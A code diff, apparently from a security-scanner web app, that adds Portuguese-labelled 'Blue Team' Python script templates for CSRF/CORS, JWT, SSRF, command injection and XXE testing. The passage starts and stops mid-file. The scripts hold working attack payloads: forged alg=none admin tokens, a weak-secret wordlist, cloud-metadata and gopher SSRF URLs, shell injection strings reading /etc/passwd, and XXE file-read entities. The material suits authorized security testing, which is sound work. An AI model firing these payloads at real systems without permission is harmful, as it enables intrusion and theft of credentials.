+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 8
+HEADERS = {"User-Agent": "BlueTeam-CSRFTester/1.0"}
+
+STATE_CHANGING_PATHS = [
+    "/api/users", "/api/profile", "/api/settings",
+    "/api/password", "/api/email", "/api/auth",
+    "/api/v1/users", "/api/account",
+    "/auth/v1/user",  # Supabase
+    "/api/delete", "/api/transfer",
+]
+
+def check_samesite_cookies(base):
+    try:
+        r = requests.get(base, timeout=TIMEOUT, verify=False, headers=HEADERS)
+        findings = []
+        for cookie in r.cookies:
+            samesite = cookie._rest.get("SameSite", "").lower() if hasattr(cookie, "_rest") else ""
+            secure = cookie.secure
+            httponly = cookie.has_nonstandard_attr("HttpOnly") if hasattr(cookie, "has_nonstandard_attr") else False
+            issue = not samesite or samesite == "none"
+            findings.append({
+                "name": cookie.name, "secure": secure,
+                "samesite": samesite or "NOT SET",
+                "httponly": httponly, "issue": issue
+            })
+            if issue:
+                print(f"  ⚠️  Cookie sem SameSite: {cookie.name}")
+            else:
+                print(f"  ✅ Cookie OK: {cookie.name} (SameSite={samesite})")
+        return findings
+    except Exception as e:
+        return [{"error": str(e)[:40]}]
+
+def check_csrf_on_endpoint(base, path, method="POST"):
+    url = base.rstrip("/") + path
+    findings = []
+    try:
+        # Tenta sem CSRF token e com Origin diferente
+        headers = {**HEADERS,
+                   "Origin": "https://evil-attacker.com",
+                   "Referer": "https://evil-attacker.com/csrf-attack",
+                   "Content-Type": "application/json"}
+        payload = {"test": "csrf-probe", "action": "update"}
+
+        if method == "POST":
+            r = requests.post(url, json=payload, timeout=TIMEOUT, verify=False, headers=headers)
+        else:
+            r = requests.put(url, json=payload, timeout=TIMEOUT, verify=False, headers=headers)
+
+        # Se não retorna 403/401/422 pode ser vulnerável a CSRF
+        cors_allow_origin = r.headers.get("Access-Control-Allow-Origin", "")
+        cors_allow_creds = r.headers.get("Access-Control-Allow-Credentials", "false")
+
+        if cors_allow_origin == "*" and cors_allow_creds.lower() == "true":
+            findings.append({"path": path, "issue": "CORS wildcard + credentials — CSRF/CORS misconfiguration",
+                              "severity": "CRITICAL"})
+            print(f"  🔴 CRÍTICO! CORS wildcard + credentials: {path}")
+        elif r.status_code not in [401, 403, 404, 405, 422]:
+            findings.append({"path": path, "status": r.status_code,
+                              "issue": "Request accepted from foreign origin without CSRF check",
+                              "severity": "HIGH"})
+            print(f"  ⚠️  Possível CSRF: {path} → {r.status_code}")
+        else:
+            print(f"  ✅ Protegido: {path} → {r.status_code}")
+    except Exception:
+        pass
+    return findings
+
+def check_cors_preflight(base):
+    findings = []
+    try:
+        r = requests.options(base, timeout=TIMEOUT, verify=False,
+                             headers={**HEADERS,
+                                      "Origin": "https://evil.com",
+                                      "Access-Control-Request-Method": "POST",
+                                      "Access-Control-Request-Headers": "Authorization"})
+        allow_origin = r.headers.get("Access-Control-Allow-Origin", "")
+        allow_creds = r.headers.get("Access-Control-Allow-Credentials", "")
+        allow_methods = r.headers.get("Access-Control-Allow-Methods", "")
+
+        if allow_origin in ["*", "https://evil.com"]:
+            findings.append({"issue": f"CORS allows evil.com: {allow_origin}", "severity": "CRITICAL"})
+            print(f"  🔴 CORS aceita origem maliciosa: {allow_origin}")
+        elif not allow_origin:
+            print(f"  ✅ CORS preflight não permite origem externa")
+        else:
+            print(f"  ✅ CORS controlado: {allow_origin}")
+
+        if allow_creds.lower() == "true" and allow_origin == "*":
+            findings.append({"issue": "CORS * + credentials = CSRF risk!", "severity": "CRITICAL"})
+    except Exception:
+        pass
+    return findings
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — CSRF Token Tester                               ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_findings = []
+
+    print("[*] Verificando SameSite em cookies...")
+    cookie_findings = check_samesite_cookies(base)
+
+    print()
+    print("[*] Testando CORS preflight...")
+    cors_findings = check_cors_preflight(base)
+    all_findings.extend(cors_findings)
+
+    print()
+    print("[*] Testando endpoints de mudança de estado...")
+    for path in STATE_CHANGING_PATHS[:8]:
+        findings = check_csrf_on_endpoint(base, path)
+        all_findings.extend(findings)
+
+    print()
+    print("=" * 64)
+    criticals = [f for f in all_findings if f.get("severity") == "CRITICAL"]
+    print(f"  Vulnerabilidades CSRF encontradas: {len(all_findings)}")
+    print(f"  🔴 Críticas: {len(criticals)}")
+    if not all_findings:
+        print("  ✅ Proteções CSRF adequadas!")
+    else:
+        print()
+        print("  RECOMENDAÇÕES:")
+        print("     • Implementar tokens CSRF em todos os formulários")
+        print("     • Configurar SameSite=Strict ou SameSite=Lax em cookies")
+        print("     • Restringir CORS a origens permitidas explicitamente")
+        print("     • Validar header Origin/Referer no servidor")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "cookie_findings": cookie_findings, "cors_findings": cors_findings,
+              "csrf_findings": all_findings}
+    with open("csrf_test_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: csrf_test_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 13. JWT Analyzer ──────────────────────────────────────────────
+  jwt_analyzer: {
+    id: 'jwt_analyzer',
+    name: 'JWT Token Analyzer',
+    category: 'Autenticação',
+    severity: 'critical',
+    description: 'Analisa JWTs expostos: algoritmo none, weak secrets, RS256 confusion, key exposure, claims inseguras e expiração.',
+    icon: '🔏',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — JWT Token Analyzer                              ║
+║  Propósito: Detectar falhas em implementações JWT            ║
+║  Alvo: ${url}
+║  Uso: python jwt_analyzer.py [URL] [optional-jwt-token]      ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, base64, time, requests, re, hmac, hashlib
+from datetime import datetime
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+KNOWN_JWT   = sys.argv[2] if len(sys.argv) > 2 else None
+TIMEOUT = 8
+HEADERS = {"User-Agent": "BlueTeam-JWTAnalyzer/1.0"}
+
+WEAK_SECRETS = [
+    "secret", "password", "123456", "admin", "jwt_secret",
+    "supersecret", "change_me", "your-secret", "mysecret",
+    "key", "private", "token", "auth", "supabase",
+    "development", "test", "debug", "qwerty", "",
+]
+
+def decode_b64_safe(s):
+    s += "=" * (-len(s) % 4)
+    try:
+        return json.loads(base64.urlsafe_b64decode(s))
+    except Exception:
+        return None
+
+def analyze_jwt(token):
+    """Decodifica e analisa um JWT sem verificar assinatura."""
+    parts = token.strip().split(".")
+    if len(parts) != 3:
+        return {"valid_format": False, "error": "Not a valid JWT format"}
+
+    header  = decode_b64_safe(parts[0])
+    payload = decode_b64_safe(parts[1])
+    if not header or not payload:
+        return {"valid_format": False, "error": "Cannot decode JWT"}
+
+    issues = []
+    alg = header.get("alg", "").upper()
+
+    if alg == "NONE":
+        issues.append({"severity": "CRITICAL", "issue": "alg=none! JWT is unsigned — trivially forgeable"})
+    elif alg in ["HS256", "HS384", "HS512"]:
+        issues.append({"severity": "INFO", "issue": f"HMAC ({alg}) — check for weak secret"})
+    elif alg.startswith("RS"):
+        issues.append({"severity": "INFO", "issue": f"RSA ({alg}) — check for RS256->HS256 confusion"})
+
+    # Verifica claims perigosas
+    exp = payload.get("exp")
+    iat = payload.get("iat")
+    now = time.time()
+
+    if not exp:
+        issues.append({"severity": "HIGH", "issue": "No 'exp' claim — token never expires!"})
+    elif exp < now:
+        issues.append({"severity": "WARN", "issue": f"Token EXPIRED at {datetime.fromtimestamp(exp).isoformat()}"})
+    elif exp - now > 86400 * 30:
+        issues.append({"severity": "MEDIUM", "issue": f"Token expires in {int((exp-now)/86400)} days — too long"})
+
+    return {"valid_format": True, "header": header, "payload": payload,
+            "algorithm": alg, "issues": issues,
+            "expires_at": datetime.fromtimestamp(exp).isoformat() if exp else None}
+
+def test_weak_secret(token, secret):
+    """Testa se um HMAC JWT foi assinado com segredo fraco."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return False
+    msg = f"{parts[0]}.{parts[1]}".encode()
+    for alg, digestmod in [("HS256", hashlib.sha256), ("HS384", hashlib.sha384), ("HS512", hashlib.sha512)]:
+        sig = base64.urlsafe_b64encode(
+            hmac.new(secret.encode(), msg, digestmod).digest()
+        ).rstrip(b"=").decode()
+        if sig == parts[2]:
+            return alg
+    return False
+
+def extract_jwts_from_site(base):
+    """Extrai JWTs do código-fonte do site."""
+    found = []
+    try:
+        for path in ["", "/app.js", "/main.js", "/bundle.js", "/static/js/main.js"]:
+            r = requests.get(base.rstrip("/") + path, timeout=TIMEOUT, verify=False, headers=HEADERS)
+            jwts = re.findall(r'eyJ[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}\\.[A-Za-z0-9_-]{10,}', r.text)
+            for jwt in set(jwts[:5]):
+                found.append({"source": path or "/", "token_preview": jwt[:30] + "..."})
+    except Exception:
+        pass
+    return found
+
+def test_none_algorithm(base):
+    """Testa se o servidor aceita JWTs com alg=none."""
+    try:
+        # Cria um JWT com alg=none
+        header  = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
+        payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"service_role","exp":9999999999}).encode()).rstrip(b"=").decode()
+        fake_jwt = f"{header}.{payload}."
+
+        for path in ["/api/users", "/api/me", "/api/profile", "/api/admin"]:
+            r = requests.get(base.rstrip("/") + path, timeout=TIMEOUT, verify=False,
+                             headers={**HEADERS, "Authorization": f"Bearer {fake_jwt}"})
+            if r.status_code == 200:
+                return {"accepted": True, "path": path, "severity": "CRITICAL"}
+    except Exception:
+        pass
+    return {"accepted": False}
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — JWT Token Analyzer                              ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_issues = []
+
+    print("[*] Extraindo JWTs expostos no código-fonte...")
+    exposed = extract_jwts_from_site(base)
+    if exposed:
+        for e in exposed:
+            print(f"  ⚠️  JWT encontrado em {e['source']}: {e['token_preview']}")
+            all_issues.append({"issue": f"JWT exposto em {e['source']}", "severity": "HIGH"})
+    else:
+        print("  ✅ Nenhum JWT exposto no código-fonte")
+
+    print()
+    print("[*] Testando alg=none attack...")
+    none_result = test_none_algorithm(base)
+    if none_result["accepted"]:
+        print(f"  🔴 CRÍTICO! Servidor aceita alg=none em {none_result['path']}")
+        all_issues.append(none_result)
+    else:
+        print("  ✅ Servidor rejeita alg=none")
+
+    if KNOWN_JWT:
+        print()
+        print("[*] Analisando JWT fornecido...")
+        analysis = analyze_jwt(KNOWN_JWT)
+        if analysis.get("valid_format"):
+            print(f"  Algorithm: {analysis['algorithm']}")
+            print(f"  Expires  : {analysis.get('expires_at', 'NEVER')}")
+            for issue in analysis.get("issues", []):
+                icon = "🔴" if issue["severity"] in ["CRITICAL","HIGH"] else "⚠️"
+                print(f"  {icon} [{issue['severity']}] {issue['issue']}")
+            all_issues.extend(analysis.get("issues", []))
+
+            # Testa weak secrets se HMAC
+            if analysis["algorithm"].startswith("HS"):
+                print()
+                print("[*] Testando segredos fracos (wordlist)...")
+                for secret in WEAK_SECRETS:
+                    alg = test_weak_secret(KNOWN_JWT, secret)
+                    if alg:
+                        print(f"  🔴 CRÍTICO! Segredo fraco encontrado: '{secret}' ({alg})")
+                        all_issues.append({"severity": "CRITICAL", "issue": f"JWT signed with weak secret: '{secret}'"})
+                        break
+                else:
+                    print("  ✅ Segredo não encontrado na wordlist padrão")
+
+    print()
+    print("=" * 64)
+    criticals = [i for i in all_issues if i.get("severity") == "CRITICAL"]
+    print(f"  Issues JWT: {len(all_issues)} | Críticas: {len(criticals)}")
+    if not all_issues:
+        print("  ✅ Implementação JWT aparentemente segura")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "exposed_jwts": exposed, "none_attack": none_result, "issues": all_issues}
+    with open("jwt_analysis_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: jwt_analysis_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 14. SSRF Scanner ──────────────────────────────────────────────
+  ssrf_scanner: {
+    id: 'ssrf_scanner',
+    name: 'SSRF (Server-Side Request Forgery) Scanner',
+    category: 'Injeção',
+    severity: 'critical',
+    description: 'Detecta SSRF: testa se o servidor faz requisições para URLs controladas pelo atacante, metadata de cloud, IPs internos e protocolos.',
+    icon: '🌐',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — SSRF Scanner                                    ║
+║  Propósito: Detectar Server-Side Request Forgery             ║
+║  Alvo: ${url}
+║  Uso: python ssrf_scanner.py [URL]                           ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, time, requests
+from datetime import datetime
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 8
+HEADERS = {"User-Agent": "BlueTeam-SSRFScanner/1.0"}
+
+# URLs de SSRF para testar (metadata de cloud, IPs internos)
+SSRF_PAYLOADS = [
+    "http://169.254.169.254/latest/meta-data/",           # AWS IMDSv1
+    "http://169.254.169.254/latest/user-data/",
+    "http://metadata.google.internal/computeMetadata/v1/",# GCP
+    "http://169.254.169.254/metadata/instance",           # Azure
+    "http://192.168.1.1/",                                 # Router interno
+    "http://10.0.0.1/",                                    # Rede privada
+    "http://127.0.0.1/",                                   # Localhost
+    "http://localhost/",
+    "http://0.0.0.0/",
+    "http://[::1]/",                                       # IPv6 localhost
+    "file:///etc/passwd",                                  # LFI via SSRF
+    "dict://127.0.0.1:6379/info",                         # Redis via SSRF
+    "gopher://127.0.0.1:3306/",                            # MySQL via SSRF
+    "ftp://127.0.0.1/",
+]
+
+# Parâmetros comuns que aceitam URLs
+URL_PARAMS = [
+    "url", "uri", "link", "src", "source", "dest", "destination",
+    "redirect", "path", "page", "file", "doc", "document",
+    "resource", "load", "fetch", "image", "img", "proxy",
+    "webhook", "callback", "endpoint", "api", "service",
+    "host", "domain", "target", "return", "next",
+]
+
+# Endpoints que frequentemente têm SSRF
+SSRF_ENDPOINTS = [
+    "/api/fetch", "/api/proxy", "/api/webhook",
+    "/api/preview", "/api/screenshot", "/api/render",
+    "/api/import", "/api/export", "/api/upload",
+    "/webhook", "/proxy", "/fetch", "/preview",
+    "/api/v1/import", "/api/share",
+]
+
+def test_ssrf_param(base, param, payload):
+    url = f"{base}?{param}={requests.utils.quote(payload)}"
+    try:
+        t0 = time.time()
+        r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS,
+                         allow_redirects=False)
+        elapsed = round((time.time() - t0) * 1000)
+
+        # Indicadores de SSRF bem-sucedido
+        aws_metadata = "ami-id" in r.text or "instance-id" in r.text or "security-credentials" in r.text
+        internal_data = "root:" in r.text or "localhost" in r.text.lower()
+        redirect_internal = r.status_code in [301,302,307] and any(
+            ip in r.headers.get("Location","") for ip in ["169.254", "192.168", "10.0", "127.0"]
+        )
+
+        if aws_metadata:
+            return {"vuln": True, "type": "AWS Metadata SSRF", "param": param, "payload": payload, "severity": "CRITICAL"}
+        if internal_data:
+            return {"vuln": True, "type": "Internal Data SSRF", "param": param, "payload": payload, "severity": "CRITICAL"}
+        if redirect_internal:
+            return {"vuln": True, "type": "Internal Redirect SSRF", "param": param, "payload": payload, "severity": "HIGH"}
+        if r.status_code == 200 and elapsed < 100 and "169.254" in payload:
+            return {"vuln": True, "type": "Fast response to metadata URL (possible SSRF)", "param": param}
+    except Exception:
+        pass
+    return {"vuln": False}
+
+def test_endpoint_ssrf(base, endpoint, payload):
+    url = base.rstrip("/") + endpoint
+    try:
+        for field in ["url", "src", "webhook", "endpoint"]:
+            r = requests.post(url, json={field: payload}, timeout=TIMEOUT,
+                              verify=False, headers={**HEADERS, "Content-Type": "application/json"})
+            if r.status_code == 200:
+                if any(kw in r.text for kw in ["ami-id", "instance-id", "root:", "localhost"]):
+                    return {"vuln": True, "type": "POST SSRF", "endpoint": endpoint, "field": field}
+    except Exception:
+        pass
+    return {"vuln": False}
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — SSRF Scanner                                    ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_findings = []
+
+    print("[*] Testando parâmetros URL comuns...")
+    for param in URL_PARAMS[:10]:
+        for payload in SSRF_PAYLOADS[:6]:
+            r = test_ssrf_param(base, param, payload)
+            if r["vuln"]:
+                all_findings.append(r)
+                print(f"  🔴 SSRF em ?{param}= → {payload[:50]}")
+                break
+
+    print()
+    print("[*] Testando endpoints de SSRF conhecidos...")
+    for endpoint in SSRF_ENDPOINTS[:8]:
+        for payload in SSRF_PAYLOADS[:4]:
+            r = test_endpoint_ssrf(base, endpoint, payload)
+            if r["vuln"]:
+                all_findings.append(r)
+                print(f"  🔴 SSRF em {endpoint}")
+                break
+
+    print()
+    print("=" * 64)
+    criticals = [f for f in all_findings if f.get("severity") == "CRITICAL"]
+    print(f"  SSRF encontrados: {len(all_findings)} | Críticos: {len(criticals)}")
+    if not all_findings:
+        print("  ✅ Nenhum SSRF detectado nos testes realizados")
+    else:
+        print()
+        print("  RECOMENDAÇÕES:")
+        print("     • Implemente allowlist de URLs/IPs aceitos")
+        print("     • Bloqueie acesso a IPs privados e metadata de cloud")
+        print("     • Use IMDSv2 no AWS (requer token de sessão)")
+        print("     • Valide e sanitize todos os inputs de URL")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "total": len(all_findings), "findings": all_findings}
+    with open("ssrf_scan_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: ssrf_scan_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 15. Command Injection Tester ──────────────────────────────────
+  cmd_injection: {
+    id: 'cmd_injection',
+    name: 'Command Injection Tester',
+    category: 'Injeção',
+    severity: 'critical',
+    description: 'Testa injeção de comandos OS em parâmetros e APIs. Detecta RCE (Remote Code Execution) via time-based e error-based.',
+    icon: '💻',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Command Injection Tester                        ║
+║  Propósito: Detectar RCE / Command Injection                 ║
+║  Alvo: ${url}
+║  Uso: python cmd_injection.py [URL]                          ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, time, requests
+from datetime import datetime
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 12
+HEADERS = {"User-Agent": "BlueTeam-CMDiTest/1.0"}
+
+# Payloads de detecção de command injection
+ERROR_PAYLOADS = [
+    ";id", "|id", "&&id", "\`id\`", "$(id)",
+    ";whoami", "|whoami", "&&whoami",
+    ";cat /etc/passwd", "|cat /etc/passwd",
+    ";ls", "|ls -la", "&&ls",
+    "%0aid", "%0a%0aid", "%3Bid",
+    "&& sleep 0 &&", "|| true ||",
+]
+
+TIME_PAYLOADS = [
+    ";sleep 3", "| sleep 3", "&& sleep 3",
+    ";ping -c 3 127.0.0.1", "| ping -c 3 127.0.0.1",
+    "\`sleep 3\`", "$(sleep 3)",
+    "%0asleep+3", "%0a%0asleep+3",
+    ";timeout 3 ping localhost",
+]
+
+ERROR_INDICATORS = [
+    "uid=", "gid=", "groups=",            # id output
+    "root:x:0:0", "/bin/bash",             # /etc/passwd
+    "command not found", "Permission denied",
+    "sh: ", "bash: ", "/bin/sh",
+    "total ", "drwxr",                     # ls output
+    "Win32_OperatingSystem",               # Windows
+    "Microsoft Windows", "COMPUTERNAME",
+]
+
+COMMON_PARAMS = [
+    "cmd", "exec", "command", "run", "query", "q",
+    "file", "filename", "path", "host", "domain",
+    "ip", "ping", "name", "id", "user", "input",
+    "data", "value", "param", "arg", "action",
+]
+
+def check_error_cmdi(base, param, payload):
+    url = f"{base}?{param}={requests.utils.quote(payload)}"
+    try:
+        r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
+        for indicator in ERROR_INDICATORS:
+            if indicator.lower() in r.text.lower():
+                return {"found": True, "type": "Error-based Command Injection",
+                        "param": param, "payload": payload[:40],
+                        "indicator": indicator, "severity": "CRITICAL"}
+    except Exception:
+        pass
+    return {"found": False}
+
+def check_time_cmdi(base, param, payload, threshold=2.5):
+    url = f"{base}?{param}={requests.utils.quote(payload)}"
+    try:
+        t0 = time.time()
+        requests.get(url, timeout=TIMEOUT + 5, verify=False, headers=HEADERS)
+        elapsed = time.time() - t0
+        if elapsed >= threshold:
+            return {"found": True, "type": "Time-based Command Injection",
+                    "param": param, "payload": payload[:40],
+                    "elapsed": round(elapsed, 2), "severity": "CRITICAL"}
+    except Exception:
+        pass
+    return {"found": False}
+
+def test_post_cmdi(base, endpoint, param, payload):
+    url = base.rstrip("/") + endpoint
+    try:
+        r = requests.post(url, json={param: payload}, timeout=TIMEOUT,
+                          verify=False, headers={**HEADERS, "Content-Type": "application/json"})
+        for indicator in ERROR_INDICATORS:
+            if indicator in r.text:
+                return {"found": True, "type": "POST Command Injection",
+                        "endpoint": endpoint, "param": param, "payload": payload[:40]}
+        t0 = time.time()
+        requests.post(url, json={param: ";sleep 3"}, timeout=TIMEOUT + 5,
+                      verify=False, headers={**HEADERS, "Content-Type": "application/json"})
+        if time.time() - t0 >= 2.5:
+            return {"found": True, "type": "POST Time-based CMDi", "endpoint": endpoint}
+    except Exception:
+        pass
+    return {"found": False}
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Command Injection Tester                        ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_findings = []
+
+    print("[*] Testando parâmetros GET para command injection...")
+    for param in COMMON_PARAMS[:12]:
+        for payload in ERROR_PAYLOADS[:6]:
+            r = check_error_cmdi(base, param, payload)
+            if r["found"]:
+                all_findings.append(r)
+                print(f"  🔴 CRÍTICO! CMDi em ?{param}= → {payload}")
+                break
+        else:
+            for payload in TIME_PAYLOADS[:3]:
+                r = check_time_cmdi(base, param, payload)
+                if r["found"]:
+                    all_findings.append(r)
+                    print(f"  🔴 Time-based CMDi em ?{param}= (delay: {r['elapsed']}s)")
+                    break
+
+    print()
+    print("[*] Testando endpoints de API via POST...")
+    api_endpoints = ["/api/exec", "/api/ping", "/api/run", "/api/command", "/api/shell"]
+    for endpoint in api_endpoints:
+        for param in ["cmd", "command", "exec", "query"]:
+            r = test_post_cmdi(base, endpoint, param, ";id")
+            if r["found"]:
+                all_findings.append(r)
+                print(f"  🔴 CMDi em POST {endpoint}.{param}")
+
+    print()
+    print("=" * 64)
+    print(f"  Command Injections encontradas: {len(all_findings)}")
+    if not all_findings:
+        print("  ✅ Nenhuma command injection detectada")
+    else:
+        print()
+        print("  ⚠️  ATENÇÃO: RCE detectado — prioridade máxima!")
+        print("  RECOMENDAÇÕES:")
+        print("     • NUNCA passe input do usuário diretamente para shell")
+        print("     • Use subprocess com lista de argumentos (sem shell=True)")
+        print("     • Implemente whitelist rigorosa de comandos permitidos")
+        print("     • Sandbox o servidor de aplicação (Docker, chroot)")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "total": len(all_findings), "findings": all_findings}
+    with open("cmd_injection_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: cmd_injection_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 16. XXE Injection Scanner ─────────────────────────────────────
+  xxe_scanner: {
+    id: 'xxe_scanner',
+    name: 'XXE Injection Scanner',
+    category: 'Injeção',
+    severity: 'high',
+    description: 'Testa XML External Entity (XXE) injection em endpoints que processam XML. Detecta leitura de arquivos locais e SSRF via XXE.',
+    icon: '📄',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — XXE Injection Scanner                           ║
+║  Propósito: Detectar XML External Entity injection           ║
+║  Alvo: ${url}
+║  Uso: python xxe_scanner.py [URL]                            ║
+╚══════════════════════════════════════════════════════════════╝
+"""
+
+import sys, json, requests
+from datetime import datetime
+
+requests.packages.urllib3.disable_warnings()
+
+TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
+TIMEOUT = 10
+
+XXE_PAYLOADS = [
+    # LFI via XXE
+    '''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>''',
+    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>''',
+    # SSRF via XXE
+    '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>''',
+    # Billion laughs DoS (safe — apenas 3 níveis)
+    '''<?xml version="1.0"?><!DOCTYPE lol [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;">]><lol>&b;</lol>''',
+]
+
+LFI_INDICATORS = ["root:x:0:0", "/bin/bash", "daemon:", "nobody:", "www-data"]
+
+XML_ENDPOINTS = [
+    "/api/xml", "/api/import", "/api/upload", "/api/parse",
+    "/api/v1/xml", "/api/data", "/soap", "/wsdl",
+    "/api/convert", "/api/process", "/xmlrpc.php",
+    "/api/feed", "/sitemap.xml",
+]
+
+CONTENT_TYPES = [
+    "application/xml",
+    "text/xml",
+    "application/soap+xml",
+]
+
+def test_xxe(endpoint, payload, content_type):
+    try:
+        r = requests.post(endpoint, data=payload.encode(), timeout=TIMEOUT, verify=False,
+                          headers={"User-Agent": "BlueTeam-XXEScanner/1.0",
+                                   "Content-Type": content_type})
+        for indicator in LFI_INDICATORS:
+            if indicator in r.text:
+                return {"vuln": True, "type": "XXE LFI", "severity": "CRITICAL",
+                        "indicator": indicator, "content_type": content_type}
+        if "169.254.169.254" in r.text or "ami-id" in r.text:
+            return {"vuln": True, "type": "XXE SSRF (AWS Metadata)", "severity": "CRITICAL"}
+        if r.status_code == 200 and len(r.text) > 50 and "<?xml" not in payload[:10]:
+            return {"vuln": False, "note": f"{r.status_code} — may process XML"}
+    except Exception:
+        pass
+    return {"vuln": False}
+
+def main():
+    base = TARGET_URL.rstrip("/")
+    if not base.startswith("http"):
+        base = "https://" + base
+
+    print(f"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — XXE Injection Scanner                           ║
+╠══════════════════════════════════════════════════════════════╣
+║  Alvo  : {base:<52}║
+║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
+╚══════════════════════════════════════════════════════════════╝
+""")
+
+    all_findings = []
+
+    print("[*] Testando endpoints para XXE injection...")
+    for path in XML_ENDPOINTS:
+        url = base + path
+        for payload in XXE_PAYLOADS[:3]:
+            for ctype in CONTENT_TYPES[:2]:
+                r = test_xxe(url, payload, ctype)
+                if r.get("vuln"):
+                    all_findings.append({**r, "endpoint": path})
+                    print(f"  🔴 XXE em {path} [{ctype}] — {r['type']}")
+                    break
+
+    print()
+    print("=" * 64)
+    print(f"  XXE encontradas: {len(all_findings)}")
+    if not all_findings:
+        print("  ✅ Nenhuma XXE detectada")
+    else:
+        print()
+        print("  RECOMENDAÇÕES:")
+        print("     • Desabilite DTDs externos no parser XML")
+        print("     • Use parsers seguros (defusedxml em Python)")
+        print("     • Valide e sanitize todo XML recebido")
+        print("     • Considere JSON em vez de XML nas APIs")
+
+    output = {"target": base, "timestamp": datetime.now().isoformat(),
+              "total": len(all_findings), "findings": all_findings}
+    with open("xxe_scan_results.json", "w") as f:
+        json.dump(output, f, indent=2, ensure_ascii=False)
+    print(f"\\n[✓] Resultados em: xxe_scan_results.json")
+
+if __name__ == "__main__":
+    main()
+`
+  },
+
+  // ── 17. Venom Payload Detector ─────────────────────────────────────
+  venom_detector: {
+    id: 'venom_detector',
+    name: 'Venom / Malicious Payload Detector',
+    category: 'Detecção',
+    severity: 'high',
+    description: 'Analisa respostas HTTP em busca de payloads maliciosos, backdoors, web shells, redirectores e código ofuscado injetado.',
+    icon: '🐍',
+    dependencies: ['requests'],
+    template: (url) => `#!/usr/bin/env python3
+"""
+╔══════════════════════════════════════════════════════════════╗
+║  BLUE TEAM — Venom / Malicious Payload Detector              ║
